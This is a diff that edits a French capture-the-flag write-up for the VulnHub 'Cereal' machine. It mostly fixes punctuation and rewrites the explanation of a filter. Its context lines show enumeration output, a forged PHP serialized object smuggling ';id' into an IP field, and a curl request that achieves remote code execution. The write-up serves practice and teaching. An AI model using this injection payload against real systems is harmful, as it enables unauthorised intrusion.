@@ -9,7 +9,7 @@ tags: [CTF,VulnHub]
 
 Le mauvais point, c'est qu'il y a beaucoup de services (inutiles) et comme on suppose à un moment qu'il faut brute-forcer un compte, ça prend beaucoup de temps.
 
-Spoiler : il n'y a aucun compte à brute-forcer mais il faut bien énumérer les services web.
+Spoiler : il n'y a aucun compte à brute-forcer, mais il faut bien énumérer les services web.
 
 ```console
 $ sudo nmap -sCV --script vuln -T5 -p- 192.168.56.133
@@ -93,7 +93,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 59.49 seconds
 ```
 
-On a un `Samba` qui ne veut pas de nous, un FTP avec rien d'intéressant à l'intérieur, des ports ouverts mais qui ne communiquent pas, ainsi que deux ports HTTP. 
+On a un `Samba` qui ne veut pas de nous, un FTP avec rien d'intéressant à l'intérieur, des ports ouverts, mais qui ne communiquent pas, ainsi que deux ports HTTP. 
 
 J'ai commencé par énumérer sur le port 80 :
 ```console
@@ -176,7 +176,7 @@ secure                  [Status: 200, Size: 1538, Words: 133, Lines: 50, Duratio
 
 Sur `secure.cereal.ctf` on trouve un formulaire qui demande une adresse IP pour faire un pinger.
 
-Ce script n'est pas vulnérable à une injection de commande classique mais en regardant le code il est évident qu'il y a quelque chose de particulier :
+Ce script n'est pas vulnérable à une injection de commande classique, mais en regardant le code, il est évident qu'il y a quelque chose de particulier :
 
 ```html
 <html>
@@ -238,7 +238,7 @@ Une énumération des fichiers et dossiers a remonté un dossier de backup :
 301        7l       20w      247c http://secure.cereal.ctf:44441/back_en
 ```
 
-Ce dossier `back_en` donne un 403 donc impossible de lister les fichiers. Il m'aura fallut utiliser la bonne wordlist avant de trouver quelque chose :
+Ce dossier `back_en` donne un 403 donc impossible de lister les fichiers. Il m'aura fallu utiliser la bonne wordlist avant de trouver quelque chose :
 
 ```console
 $ feroxbuster -u http://secure.cereal.ctf:44441/back_en/ -w wordlists/files/Filenames_or_Directories_All.wordlist -n
@@ -305,9 +305,9 @@ if (isset($_POST['obj'])) {
 $pingTest->validate();
 ```
 
-On voit qu'un filtre est présent pour vérifier le format d'adresse IP, mais ce filtre est utilisé seulement si l'attribut `isValid` vaut `True`.
+On voit qu'un filtre est présent pour vérifier le format d'adresse IP, mais ce filtre est utilisé seulement si l'attribut `isValid` vaut `False`, ce qui est la valeur par défaut.
 
-Il est `False` par défaut, il faut simplement qu'on forge un objet avec la bonne valeur pour atteindre l'exécution de commande.
+Il faut simplement qu'on forge un objet avec la bonne valeur pour atteindre l'exécution de commande en bypassant le filtre.
 
 J'ai écrit le code suivant :
 
@@ -331,7 +331,7 @@ Celui-ci donne cet output :
 O:8:"pingTest":2:{s:9:"ipAddress";s:3:";id";s:7:"isValid";b:1;}
 ```
 
-Une fois intégré dans la requête j'obtiens bien une RCE :
+Une fois intégré dans la requête, j'obtiens bien une RCE :
 
 ```console
 $ curl -XPOST --data 'obj=O%3A8%3A%22pingTest%22%3A2%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A3%3A%22%3Bid%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3B%7D&ip=192.168.56.1' http://secure.cereal.ctf:44441/
@@ -378,7 +378,7 @@ dr-xr-xr-x. 17 root  root   244 May 29  2021 ..
 drwxrwxr-x.  4 rocky apache 147 May 29  2021 rocky
 ```
 
-Mais en dehors du flag je n'ai rien trouvé :
+Mais en dehors du flag, je n'ai rien trouvé :
 
 ```console
 bash-4.4$ cat local.txt 
@@ -387,7 +387,7 @@ aaa87365bf3dc0c1a82aa14b4ce26bbc
 
 `LinPEAS` indiquait que le système était vulnérable à `PwnKit` mais ça n'a pas fonctionné.
 
-J'ai finalement sorti `pspy` et après quelques minutes j'ai vu ça :
+J'ai finalement sorti `pspy` et après quelques minutes, j'ai vu ça :
 
 ```console
 2025/07/09 15:20:02 CMD: UID=0    PID=70454  | /bin/sh -c /bin/bash /usr/share/scripts/chown.sh 
